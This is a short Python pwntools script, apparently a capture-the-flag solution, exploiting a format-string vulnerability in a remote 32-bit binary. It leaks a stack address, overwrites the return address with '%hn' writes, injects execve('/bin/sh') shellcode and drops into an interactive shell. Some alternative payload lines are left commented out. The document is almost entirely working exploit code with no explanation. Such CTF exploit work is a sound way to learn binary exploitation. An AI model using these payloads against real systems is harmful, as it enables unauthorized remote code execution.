from pwn import *

#25bytes
sc = "\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

#p=process("./ebp")
p=remote('cykor.kr', 13125)
p.sendline("%08x"*4)
p.recv(24)
stack_leak=int(p.recv(8),16)
retaddr=stack_leak+4
p.success("stack leak:{}".format(hex(stack_leak)))
p.success("ret addr:{}".format(hex(retaddr)))

putsgot = 0x804a014

#payload2 = asm(shellcraft.i386.sh())
#payload+="%8x%8x%8x{}x%hn".format(str)
payload = "%08x"*2 + "%" + str(retaddr%65536-16) +  "x" + "%hn"
#payload = "%08x"*2 + "%" + str(putsgot-16) +  "x" + "%n"
#payload = "%8x"*2 + "%" + str(1094795585-16) +  "x" + "%n"
p.sendline(payload)
pause()

p.sendline("%08x "*12)
print p.recv()

payload2 = sc
#payload2 +=  "%8x"*34 + "%134520688x" + "%n"
payload2 +=  "%08x"*10 + "%" + str(134520960 - 8*10 - 25) + "x" + "%n"
p.sendline(payload2)


p.interactive()

p.close()
